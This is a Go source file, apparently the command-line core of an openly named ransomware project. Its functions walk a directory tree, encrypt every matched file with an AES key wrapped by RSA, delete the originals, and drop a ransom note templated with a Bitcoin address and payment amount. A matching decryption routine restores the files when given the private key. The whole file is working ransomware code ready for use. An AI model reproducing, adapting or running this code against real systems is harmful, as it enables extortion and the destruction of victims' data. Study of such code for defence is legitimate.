package cli

import (
	"crypto/rsa"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"text/template"
	"time"

	"github.com/marmos91/ransomware/crypto"
	"github.com/marmos91/ransomware/fs"
	urfavecli "github.com/urfave/cli/v2"
)

// ransomData holds the template variables for the ransom note.
type ransomData struct {
	BitcoinAddress string
	BitcoinCount   float64
	PublicKey      string
}

// fileHeader holds metadata written at the start of each encrypted file.
type fileHeader struct {
	KeySizeBits  uint16
	FileMode     uint32
	ModTime      int64
	PartialBytes int64 // 0 = full encryption; >0 = only first N bytes encrypted
}

func newFileHeader(info os.FileInfo, keySizeBits uint16, partial int64) fileHeader {
	return fileHeader{
		KeySizeBits:  keySizeBits,
		FileMode:     uint32(info.Mode().Perm()),
		ModTime:      info.ModTime().Unix(),
		PartialBytes: partial,
	}
}

func (h *fileHeader) writeTo(w io.Writer) error {
	return binary.Write(w, binary.BigEndian, h)
}

func (h *fileHeader) readFrom(r io.Reader) error {
	return binary.Read(r, binary.BigEndian, h)
}

func loadPublicKey(path string) (*rsa.PublicKey, error) {
	pem, err := fs.ReadStringFileContent(path)
	if err != nil {
		return nil, err
	}
	return crypto.ParseRsaPublicKeyFromPemStr(pem)
}

func loadPrivateKey(path string) (*rsa.PrivateKey, error) {
	pem, err := fs.ReadStringFileContent(path)
	if err != nil {
		return nil, err
	}
	return crypto.ParseRsaPrivateKeyFromPemStr(pem)
}

// fileSize returns the size of the file at path, or 0 if it cannot be determined.
func fileSize(path string) int64 {
	info, err := os.Stat(path)
	if err != nil {
		return 0
	}
	return info.Size()
}

// processFiles applies operate to each file using parallel workers with progress
// tracking. Unless dryRun is set, originals are deleted after a successful operation.
func processFiles(files []string, workers int, dryRun bool, label string, operate func(path string) error) error {
	if len(files) == 0 {
		fmt.Fprintf(os.Stderr, "No files found for %s\n", strings.ToLower(label))
		return nil
	}

	progress := NewProgress(label, len(files))

	err := fs.ProcessFilesParallel(files, workers, func(filePath string) error {
		size := fileSize(filePath)

		if err := operate(filePath); err != nil {
			return fmt.Errorf("%s: %w", filePath, err)
		}

		if !dryRun {
			if err := fs.DeleteFileIfExists(filePath); err != nil {
				return fmt.Errorf("delete %s: %w", filePath, err)
			}
		}

		progress.Tick(filePath, size)
		return nil
	})

	progress.Summary(err != nil)
	return err
}

func Encrypt(ctx *urfavecli.Context) error {
	path := ctx.String("path")
	publicKeyPath := ctx.String("publicKey")
	addRansom := ctx.Bool("addRansom")
	ransomTemplatePath := ctx.String("ransomTemplatePath")
	ransomFileName := ctx.String("ransomFileName")
	bitcoinCount := ctx.Float64("bitcoinCount")
	bitcoinAddress := ctx.String("bitcoinAddress")
	skipHidden := ctx.Bool("skipHidden")
	dryRun := ctx.Bool("dryRun")
	recursive := ctx.Bool("recursive")
	workers := ctx.Int("workers")
	extBlacklist := splitCommaSeparated(ctx.String("extBlacklist"))
	extWhitelist := splitCommaSeparated(ctx.String("extWhitelist"))
	encSuffix := ctx.String("encSuffix")
	partial := ctx.Int64("partial")

	if partial < 0 {
		return errors.New("--partial must be a non-negative number of bytes")
	}

	if addRansom && ransomTemplatePath == "" {
		return errors.New("ransomTemplatePath is required when addRansom is enabled")
	}

	absolutePath, err := filepath.Abs(path)
	if err != nil {
		return err
	}

	publicKey, err := loadPublicKey(publicKeyPath)
	if err != nil {
		return err
	}
	keySizeBits := uint16(publicKey.Size() * 8)
	if !validKeySizes[int(keySizeBits)] {
		return fmt.Errorf("unsupported RSA key size: %d bits (supported: 2048, 3072, 4096)", keySizeBits)
	}
	slog.Info("RSA public key loaded", "keySize", keySizeBits)

	plainAesKey, err := crypto.NewRandomAesKey(crypto.AES_KEY_SIZE)
	if err != nil {
		return err
	}
	slog.Debug("Generated AES session key")

	encryptedAesKey, err := crypto.RsaEncrypt(plainAesKey, publicKey)
	if err != nil {
		return err
	}

	slog.Info("Starting encryption",
		"path", absolutePath,
		"workers", workers,
		"dryRun", dryRun,
		"recursive", recursive,
		"encSuffix", encSuffix,
		"partial", partial,
	)
	slog.Debug("Extension filters",
		"blacklist", extBlacklist,
		"whitelist", extWhitelist,
		"skipHidden", skipHidden,
	)
	slog.Debug("Encrypted AES key", "keySize", len(encryptedAesKey))
	slog.Debug("Ransom configuration",
		"bitcoinAddress", bitcoinAddress,
		"bitcoinCount", bitcoinCount,
		"templatePath", ransomTemplatePath,
		"fileName", ransomFileName,
	)

	files, err := fs.WalkAndCollect(absolutePath, extBlacklist, extWhitelist, skipHidden, recursive)
	if err != nil {
		return err
	}

	if err := processFiles(files, workers, dryRun, "Encrypting", func(filePath string) error {
		return encryptFile(filePath, plainAesKey, encryptedAesKey, keySizeBits, partial, encSuffix)
	}); err != nil {
		return err
	}

	if addRansom {
		return writeRansomNote(absolutePath, ransomFileName, ransomTemplatePath, publicKey, bitcoinAddress, bitcoinCount)
	}

	return nil
}

func Decrypt(ctx *urfavecli.Context) error {
	path := ctx.String("path")
	privateKeyPath := ctx.String("privateKey")
	dryRun := ctx.Bool("dryRun")
	skipHidden := ctx.Bool("skipHidden")
	recursive := ctx.Bool("recursive")
	workers := ctx.Int("workers")
	encSuffix := ctx.String("encSuffix")
	ransomFileName := ctx.String("ransomFileName")
	extWhitelist := []string{encSuffix}

	absolutePath, err := filepath.Abs(path)
	if err != nil {
		return err
	}

	rsaPrivateKey, err := loadPrivateKey(privateKeyPath)
	if err != nil {
		return err
	}
	slog.Info("RSA private key loaded")

	slog.Info("Starting decryption",
		"path", absolutePath,
		"workers", workers,
		"dryRun", dryRun,
		"recursive", recursive,
		"encSuffix", encSuffix,
	)
	slog.Debug("Decrypt filters",
		"whitelist", extWhitelist,
		"fileName", ransomFileName,
		"skipHidden", skipHidden,
	)

	files, err := fs.WalkAndCollect(absolutePath, nil, extWhitelist, skipHidden, recursive)
	if err != nil {
		return err
	}

	if err := processFiles(files, workers, dryRun, "Decrypting", func(filePath string) error {
		return decryptFile(filePath, rsaPrivateKey, encSuffix)
	}); err != nil {
		return err
	}

	if !dryRun {
		return fs.DeleteFileIfExists(filepath.Join(absolutePath, ransomFileName))
	}
	return nil
}

func writeRansomNote(dir, fileName, templatePath string, publicKey *rsa.PublicKey, bitcoinAddress string, bitcoinCount float64) (retErr error) {
	ransomPath := filepath.Join(dir, fileName)
	slog.Info("Adding ransom file", "path", ransomPath)

	templateAbsPath, err := filepath.Abs(templatePath)
	if err != nil {
		return err
	}

	tmpl, err := template.ParseFiles(templateAbsPath)
	if err != nil {
		return err
	}

	textPublicKey, err := crypto.ExportRsaPublicKeyAsPemStr(publicKey)
	if err != nil {
		return err
	}

	// O_EXCL fails atomically if the file already exists, avoiding a TOCTOU race.
	file, err := os.OpenFile(ransomPath, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0644)
	if errors.Is(err, os.ErrExist) {
		slog.Warn("Ransom file already exists, skipping", "path", ransomPath)
		return nil
	}
	if err != nil {
		return err
	}
	defer func() {
		if closeErr := file.Close(); retErr == nil && closeErr != nil {
			retErr = fmt.Errorf("close ransom note: %w", closeErr)
		}
	}()

	return tmpl.Execute(file, &ransomData{
		BitcoinCount:   bitcoinCount,
		BitcoinAddress: bitcoinAddress,
		PublicKey:      textPublicKey,
	})
}

func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, keySizeBits uint16, partial int64, encSuffix string) (retErr error) {
	src, err := os.Open(path)
	if err != nil {
		return err
	}
	defer func() { _ = src.Close() }()

	srcInfo, err := src.Stat()
	if err != nil {
		return err
	}

	// Clamp partial to file size (encrypt whole file if partial >= file size).
	if partial > 0 && partial >= srcInfo.Size() {
		partial = 0
	}

	outPath := path + encSuffix
	dst, err := os.OpenFile(outPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil {
		return err
	}
	defer func() {
		if closeErr := dst.Close(); retErr == nil && closeErr != nil {
			retErr = fmt.Errorf("close encrypted file: %w", closeErr)
		}
		if retErr != nil {
			_ = os.Remove(outPath)
		}
	}()

	hdr := newFileHeader(srcInfo, keySizeBits, partial)
	if err := hdr.writeTo(dst); err != nil {
		return fmt.Errorf("write file header: %w", err)
	}

	if _, err := dst.Write(encryptedAesKey); err != nil {
		return fmt.Errorf("write encrypted key: %w", err)
	}

	// Encrypt either the first N bytes (partial) or the entire file.
	var encReader io.Reader = src
	if partial > 0 {
		encReader = io.LimitReader(src, partial)
	}

	if err := crypto.AesEncryptStream(encReader, dst, aesKey); err != nil {
		return err
	}

	// Copy remaining unencrypted bytes (only for partial encryption).
	if partial > 0 {
		if _, err := io.Copy(dst, src); err != nil {
			return fmt.Errorf("write unencrypted tail: %w", err)
		}
	}

	return nil
}

func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) (retErr error) {
	src, err := os.Open(path)
	if err != nil {
		return err
	}
	defer func() { _ = src.Close() }()

	var hdr fileHeader
	if err := hdr.readFrom(src); err != nil {
		return fmt.Errorf("read file header: %w", err)
	}

	if !validKeySizes[int(hdr.KeySizeBits)] {
		return fmt.Errorf("invalid key size in file header: %d bits", hdr.KeySizeBits)
	}

	keySizeBytes := int(hdr.KeySizeBits) / 8
	if keySizeBytes != rsaPrivateKey.Size() {
		return fmt.Errorf("key size mismatch: file encrypted with %d-bit key, but private key is %d-bit",
			hdr.KeySizeBits, rsaPrivateKey.Size()*8)
	}

	encryptedKey := make([]byte, keySizeBytes)
	if _, err := io.ReadFull(src, encryptedKey); err != nil {
		return fmt.Errorf("read encrypted key: %w", err)
	}

	aesKey, err := crypto.RsaDecrypt(encryptedKey, rsaPrivateKey)
	if err != nil {
		return err
	}

	outPath := strings.TrimSuffix(path, encSuffix)
	perm := os.FileMode(hdr.FileMode) & os.ModePerm
	dst, err := os.OpenFile(outPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, perm)
	if err != nil {
		return err
	}
	defer func() {
		if closeErr := dst.Close(); retErr == nil && closeErr != nil {
			retErr = fmt.Errorf("close decrypted file: %w", closeErr)
		}
		if retErr != nil {
			_ = os.Remove(outPath)
		}
	}()

	if err := crypto.AesDecryptStream(src, dst, aesKey); err != nil {
		return err
	}

	// Copy remaining unencrypted bytes (partial encryption).
	if hdr.PartialBytes > 0 {
		if _, err := io.Copy(dst, src); err != nil {
			return fmt.Errorf("read unencrypted tail: %w", err)
		}
	}

	// Restore original permissions (also covers existing files where create mode is ignored).
	if err := dst.Chmod(perm); err != nil {
		return fmt.Errorf("restore permissions: %w", err)
	}

	// Restore original modification time.
	modTime := time.Unix(hdr.ModTime, 0)
	return os.Chtimes(outPath, modTime, modTime)
}

// splitCommaSeparated splits a comma-separated string into a trimmed slice,
// returning nil for empty input.
func splitCommaSeparated(s string) []string {
	s = strings.TrimSpace(s)
	if s == "" {
		return nil
	}

	parts := strings.Split(s, ",")
	result := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p != "" {
			result = append(result, p)
		}
	}
	if len(result) == 0 {
		return nil
	}
	return result
}
